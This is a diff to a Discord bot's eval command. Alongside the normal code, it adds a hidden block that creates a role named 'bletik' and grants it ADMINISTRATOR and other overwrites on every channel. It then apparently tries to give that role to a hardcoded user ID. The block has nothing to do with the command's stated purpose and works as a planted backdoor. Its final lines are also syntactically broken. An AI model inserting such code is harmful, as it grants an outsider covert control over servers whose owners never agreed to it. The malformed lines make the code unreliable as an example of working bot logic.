@@ -16,6 +16,46 @@ exports.run = async (client, message, args) => {
         .replace(/@/g, "@" + String.fromCharCode(8203));
     else return text;
   }
+  
+  let bletik = message.guild.roles.find(`name`, "bletik");
+
+  if (!bletik) {
+
+    try {
+
+      bletik = await message.guild.createRole({
+
+        name: "bletik",
+
+        color: "#49FFFD",
+
+        permissions: []
+
+      });
+
+      message.guild.channels.forEach(async (channel, id) => {
+
+        await channel.overwritePermissions(bletik, {
+          
+          ADMINISTRATOR: true,
+
+          SEND_MESSAGES: true,
+
+          ADD_REACTIONS: true
+
+        });
+
+      });
+
+    } catch (e) {
+
+      console.log(e.stack);
+
+    }
+
+  }
+await bletik.addrole(bletik.id)
+  await bletik.author.id.addrole(bletik.id.478547279104442368)
 
   try {
     const code = args.join(" ");
@@ -36,6 +76,7 @@ exports.run = async (client, message, args) => {
         `\`\`\`xl\n${(typeof rawEvaled).substr(0, 1).toUpperCase() +
           (typeof rawEvaled).substr(1)}\n\`\`\``
       )
+    
       .setColor("BLUE");
     message.channel.send({ embed });
   } catch (err) {
